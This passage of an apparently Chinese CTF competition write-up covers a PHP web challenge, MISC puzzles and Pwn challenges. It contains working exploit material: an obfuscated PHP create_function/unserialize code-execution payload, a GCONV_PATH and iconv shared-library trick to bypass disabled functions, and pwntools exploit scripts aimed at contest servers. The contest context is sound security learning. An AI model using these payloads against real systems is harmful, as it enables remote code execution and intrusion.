    while True:
        fun = input("Firebasky>: ").strip(")").split("(")
        exp = ''
        for each in fun[:-1]:
            exp += urlbm(each)
            print(exp)
        exp += ")" * (len(fun) - 1) + ";"
        print(exp)
        #call_user_func(...unserialize(end(getallheaders())));
发现php中调用函数的时候传递数组可以所以 **…** 最重要的是如何控制一个数组。hzx
拉了个屎就想到了。然后执行代码可以使用create_function去使用。
    [~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));
如下脚本
    fwrite($_POST[1]);/*');
    $c =array("create_function","",'2;};putenv("GCONV_PATH=/tmp/");highlight_file("php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so");/*');
    echo serialize($c);
    # putenv("GCONV_PATH=/tmp/");highlight_file('php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/payload.so');
    //$a='a:3:{i:0;s:15:"create_function";i:1;s:0:"";i:2;s:15:"2;}phpinfo();/*";}';
    //$b=unserialize($a);
    //echo gettype($b);
    //call_user_func(...$b);
写进去gconv-modules和payload.so
    module  PAYLOAD//    INTERNAL    ../../../../../../../../tmp/payload    2
    module  INTERNAL   PAYLOAD//    ../../../../../../../../tmp/payload    2
触发
    POST / HTTP/1.1
    Host: 124.70.199.17:8001
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 570
    cmd:a:3:{i:0;s:15:"create_function";i:1;s:0:"";i:2;s:122:"2;};putenv("GCONV_PATH=/tmp/");highlight_file("php://filter/read=convert.iconv.payload.utf-8/resource=/tmp/payload.so");/*";}
    cmd=[~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c][!%FF](...[~%8a%91%8c%9a%8d%96%9e%93%96%85%9a][!%FF]([~%9a%91%9b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())));&1=%6d%6f%64%75%6c%65%20%20%45%58%50%2f%2f%20%20%20%20%49%4e%54%45%52%4e%41%4c%20%20%20%20%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%74%6d%70%2f%65%78%70%20%20%20%20%32%0a%6d%6f%64%75%6c%65%20%20%49%4e%54%45%52%4e%41%4c%20%20%20%45%58%50%2f%2f%20%20%20%20%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%74%6d%70%2f%65%78%70%20%20%20%20%32
读文件。
其实前面就一个unser去控制一个数组执行任意代码,后面的bypass df和qwnt 一样。。。
## MISC
###  This_is_A_tree
我先是自己列了一个树状图：
因为是有tree的提示，所以就按照前序/中序/后序这些试一试：
中序密文：
    Q2hpbmVzZSB0cmFkaXRpb25hbCBjdWx0dXJlIGlzIGJyb2FkIGFuZCBwcm9mb3VuZCEgU28gSSBXYW50IEdpdmUgWW91IE15IEZsYWcgQnV0IFlvdSBOZWVkIERlY29kZSBJdC5FbmpveSBUaGUgRmxhZyEhOuW4iCDlhZEg5aSNIOaNnyDlt70g6ZyHIOaZiyDlp6Qg5aSn6L+HIOiuvCDlmazll5Eg6ZyHIOaBkiDoioIg6LGrIA==
base64解密后：
    Chinese traditional culture is broad and profound! So I Want Give You My Flag But You Need Decode It.Enjoy The Flag!!:师 兑 复 损 巽 震 晋 姤 大过 讼 噬嗑 震 恒 节 豫
易经的编码我在BJDCTF2020 见到过：
    https://blog.csdn.net/weixin_44110537/article/details/107494966
因此改一下脚本：
    s = '师兑复损巽震晋姤大过讼噬嗑震恒节豫'
    dic = {
        '坤': '000000',
        '剥': '000001',
        '比': '000010',
        '观': '000011',
        '豫': '000100',
        '晋': '000101',
        '萃': '000110',
        '否': '000111',
        '谦': '001000',
        '艮': '001001',
        '蹇': '001010',
        '渐': '001011',
        '小过': '001100',
        '旅': '001101',
        '咸': '001110',
        '遁': '001111',
        '师': '010000',
        '蒙': '010001',
        '坎': '010010',
        '涣': '010011',
        '解': '010100',
        '未济': '010101',
        '困': '010110',
        '讼': '010111',
        '升': '011000',
        '蛊': '011001',
        '井': '011010',
        '巽': '011011',
        '恒': '011100',
        '鼎': '011101',
        '大过': '011110',
        '姤': '011111',
        '复': '100000',
        '颐': '100001',
        '屯': '100010',
        '益': '100011',
        '震': '100100',
        '噬嗑': '100101',
        '随': '100110',
        '无妄': '100111',
        '明夷': '101000',
        '贲': '101001',
        '既济': '101010',
        '家人': '101011',
        '丰': '101100',
        '离': '101101',
        '革': '101110',
        '同人': '101111',
        '临': '110000',
        '损': '110001',
        '节': '110010',
        '中孚': '110011',
        '归妹': '110100',
        '睽': '110101',
        '兑': '110110',
        '履': '110111',
        '泰': '111000',
        '大畜': '111001',
        '需': '111010',
        '小畜': '111011',
        '大壮': '111100',
        '大有': '111101',
        '夬': '111110',
        '干': '111111'
    }
    li = []
    k = 0
    for i in range(len(s)):
        if k == 1:
            k = 0
            continue
        try:
            li.append(dic[s[i]])
        except:
            t = ''
            t = t + s[i] + s[i + 1]
            li.append(dic[t])
            k = 1
    ss = ''.join(li)
    print(ss)
    print('----------------')
    enc = ''
    for i in range(0, len(ss), 8):
        enc += chr(eval('0b' + ss[i:i + 8]))
    print(enc)
得到解密后的：
因此得到flag：
    SCTF{Ch1nA_yyds!}
###  fumo_xor_cli
nc过去打印很多字符，然后重定向保存到文件
分析一下发现 有不少空格 所以按照`\n\n`分割，分割出
57个文件，再通过脚本把颜色提取出来做成图片：
    import re
    from PIL import Image
    for k in range(57):
        img = Image.new("RGB",(133,50))
        f = open(f"{k}","r").read()
        lines = f.split("\n")
        for i in range(len(lines)):
            rgbs = re.findall(r"38;2;(.*?);(.*?);(.*?)m",lines[i])
            for j in range(len(rgbs)):
                rgb = (int(rgbs[j][0]),int(rgbs[j][1]),int(rgbs[j][2]))
                img.putpixel((j,i),rgb)
        img.save(f"{k}.png")
看一遍之后发现序号为21和25的有些怪，所以单独拿出来
再这些文件里边有一个weixin的链接点进去时fomo图，放大了看有很多小点点，把这些一个一个像素点提取出来成图片：
脚本如下:
    from PIL import Image
    img = Image.open("TpMSkq.png")
    img_save = Image.new("RGB",(133,100))
    width,hight = img.size
    for i in range(1,width,9):
        for j in range(1,hight,9):
            rgb = img.getpixel((i,j))
            try:
                img_save.putpixel(((j-1)//9,(i-1)//9),rgb)
            except:
                continue
    img_save.save("out.png")
提取出来跟另外两张图对比一下发现，很多点和其中一张是一样的，再对比一下发现偏移50和另一张也很相似，猜测得把两个拼起来再异或或者盲水印，但是图太小了盲水印肯定看不清所以应该是异或，得到
翻转一下，得到flag
###  in_the_vaporwaves
用sonic visualiser打开
选这个，发现有很多不对劲的：
仔细一看是摩斯电码，一个一个记下来然后转码，好像我还记错了一个VAPORW[@UES](https://github.com/UES
"@UES")猜测一下是蒸汽波改成VAPORW[@VES](https://github.com/VES "@VES")就对了
SCTF{DES1R3_DRIVES_INT0_VAPORW[@VES](https://github.com/VES "@VES")}
## Pwn
###  dataleak
盲区，先去审计一下代码。
他有一段字符this is the data on server这段字符串在远端是一串数据
题目要求是泄露数据
远端程序在泄露这段数据之后，会继续问你要这段数据，如果匹配就会print flag
通过审计上面的代码我们可以知道，可以利用/ _把字符串复制上去，那我们就利用_ /*来泄露
要先泄露data1，然后data2，很好理解（连蒙带猜，试了不少）
exp：
    from pwn import *
    p = process('./cJSON_PWN')
    p = remote('124.70.202.226', 2101)
    context.log_level = 'debug'
    pl = '"' + 'A'* 12 + '\\' # last rsi + 6
    pl = '\n' * 4 + '"' + 'A'* 8 + '\\' # last rsi + 6
    io.send(pl)
    pl = '\n' * 12 + '"\\'
    p.send(pl)
    # 12 + 4 == 0x10
    data = p.recv(11)
    print('data1: ' + str(data))
    pl = 'abcde/*fghijkl' # last rsi + 6
    #gdb.attach(p)
    p.send(pl)
    pl = '/*aaaaaaaaaaaa'
    p.send(p)
    data2 = p.recv(11)
    print('data2: ' + str(data2))
    data = data + data2
    print('data: ' + data)
    p.sendline(data)
    p.interactive()
###  Gadget
沙盒可以看出没有对架构进行判断
用retfq将程序变成32位架构，完事调用open把文件流创起来，然后用retf回到64位，使用盲注的方式，这里我用的是这个地方，
r13跟rax都可控，r13小于rax的话，程序死循环，反之程序直接down。
大概就是这样，具体可以看exp，如果能看的进去的话…….
    # -*- coding: utf-8 -*
    from pwn import *
    #context.log_level = 'debug'
    context.arch = 'amd64'
    #context.terminal = ['tmux','new-window']
    def pwn(p,num,flag_ord):
        fake_stack = 0x40D160 + 0x400
        pop_rax_ret = 0x0000000000401001